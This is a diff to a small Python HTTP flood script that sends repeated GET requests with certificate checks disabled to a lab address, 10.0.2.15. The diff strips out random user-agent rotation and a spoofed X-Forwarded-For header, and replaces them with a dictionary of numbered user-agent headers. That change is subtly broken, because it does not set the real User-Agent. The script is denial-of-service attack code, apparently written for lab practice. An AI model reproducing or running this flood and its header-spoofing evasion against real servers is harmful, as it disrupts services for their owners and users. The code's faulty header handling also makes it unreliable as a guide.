@@ -1,26 +1,6 @@
 import requests
 import threading
 import subprocess
-import random
-import urllib3
-
-urllib3.disable_warnings()
-
-# fake IP address, but this doesn't make us anonymous
-fake_ip = '192.168.1.100'
-
-user_agents = [
-    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.0",
-    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.01",
-    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.02",
-    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.50",
-    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.51",
-    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.52",
-    "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.53",
-    "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.22",
-    "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.24",
-    "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.26"
-]
 
 def show_logs():
     try:
@@ -31,16 +11,24 @@ def show_logs():
         print(f"Error: {e}")
 
 def http_flood(target_url, num_of_requests):
+    user_agents = {
+        "User-Agent-1": "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.0",
+        "User-Agent-2": "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.01",
+        "User-Agent-3": "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.02",
+        "User-Agent-4": "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.50",
+        "User-Agent-5": "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.51",
+        "User-Agent-6": "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.52",
+        "User-Agent-7": "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.53",
+        "User-Agent-8": "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.22",
+        "User-Agent-9": "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.24",
+        "User-Agent-10": "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.26"
+    }
+
     # Flood the webpage with requests
     for _ in range(num_of_requests):
         try:
-            # Randomly select a user-agent string
-            user_agent = random.choice(user_agents)
-
             # verify=False ensures that the SSL certificate verification for the HTTP requests is skipped
-            # Send HTTP Get request with random user agent
-            send_request = requests.get(target_url, headers={'User-Agent': user_agent, 'X-Forwarded-For': fake_ip},
-                                        verify=False)
+            send_request = requests.get(target_url, headers=user_agents, verify=False)
             print(f"Request status: {send_request.status_code}")
             print()
         except Exception as e:
@@ -48,7 +36,7 @@ def http_flood(target_url, num_of_requests):
 
 
 if __name__ == "__main__":
-    target_url = "https://10.0.2.15/real-estate-html-template/index.html"
+    target_url = "https://10.0.2.15"
     num_of_requests = 50
 
     print(f"Starting http flood, targeting {target_url}")
